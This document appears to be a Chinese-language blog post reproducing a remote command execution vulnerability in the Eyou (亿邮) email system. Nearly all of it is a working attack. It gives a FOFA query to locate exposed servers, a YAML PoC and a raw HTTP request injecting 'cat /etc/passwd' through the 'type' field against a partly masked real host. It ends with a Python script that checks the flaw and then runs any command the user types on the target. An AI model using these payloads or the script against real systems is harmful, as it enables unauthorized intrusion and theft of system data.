---
title: 亿邮电子邮件系统RCE
tags:
  - 漏洞复现
categories:
  - 漏洞复现
copyright: true
abbrlink: e09aeac0
date: 2021-07-13 00:16:08
---

![](https://z3.ax1x.com/2021/07/13/WFHmrV.jpg)
<!--more-->

HW漏洞，亿邮电子邮件系统存在远程命令执行漏洞，可执行任意命令。

**验证**

 fofa `body="亿邮电子邮件系统"`

​	登录页面这样子：

![img](https://z3.ax1x.com/2021/07/13/WFbJYQ.png)

写个PoC验证一下

```yaml
name: poc-yaml-eyou-email-rce
rules:
  - method: POST
    path: "/webadm/?q=moni_detail.do&action=gragh"
    headers:
      Content-Type: application/x-www-form-urlencoded
    follow_redirects: false
    body: |
      type='|cat /etc/passwd||'
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string("root")))
detail:
  author: Secde0(https://www.cnblogs.com/Secde0/)
  links:
    - https://github.com/PeiQi0/PeiQi-WIKI-POC/blob/PeiQi/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md

```

结果如下：

![img](https://z3.ax1x.com/2021/07/13/WFb1w8.png)

发送请求包：

```sqlite
POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
Host: 36.x.x.x:88
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36

type='|cat /etc/passwd||'
```

`cat /etc/passwd`

![img](https://z3.ax1x.com/2021/07/13/WFbGFg.png)

当前网络连接情况：

![img](https://z3.ax1x.com/2021/07/13/WFb3TS.png)

PY脚本

```python
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: Eyou Email SYSTEM                                       \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCmd         >>> whoami                                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, cmd):
    vuln_url = target_url + "/webadm/?q=moni_detail.do&action=gragh"
    headers = {
            "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "type='|cat /etc/passwd||'"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}//webadm/?q=moni_detail.do&action=gragh \033[0m".format(target_url))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                cmd = input("\033[35mCmd >>> \033[0m")
                if cmd == "exit":
                    sys.exit(0)
                else:
                    POC_2(target_url, cmd)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, cmd):
    vuln_url = target_url + "/webadm/?q=moni_detail.do&action=gragh"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "type='|{}||'".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    cmd = 'cat /etc/passwd'
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url, cmd)
```

**Reference**

http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html

